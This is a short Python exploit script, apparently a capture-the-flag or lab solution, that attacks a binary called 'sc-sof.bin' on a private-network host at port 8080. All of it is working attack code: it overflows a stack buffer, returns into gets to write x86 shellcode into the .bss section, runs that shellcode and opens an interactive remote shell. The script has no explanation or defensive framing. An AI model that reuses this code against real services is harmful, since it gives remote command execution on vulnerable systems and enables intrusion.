#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.139','port':8080}

binf = ELF('sc-sof.bin')

addr_plt_gets       = binf.plt('gets')
addr_bss            = binf.section('.bss')
addr_buf            = addr_bss + 0x100

#==========
def attack(cmn):
    exploit  = 'a'*0x2c
    exploit += pack_32(addr_plt_gets)
    exploit += pack_32(addr_buf)
    exploit += pack_32(addr_buf)
    
    cmn.read_until('Name >> ')
    cmn.sendln(exploit)

    sc = ShellCode('x86')
    shellcode = sc.sh()
    
    cmn.sendln(shellcode)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)
    
    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
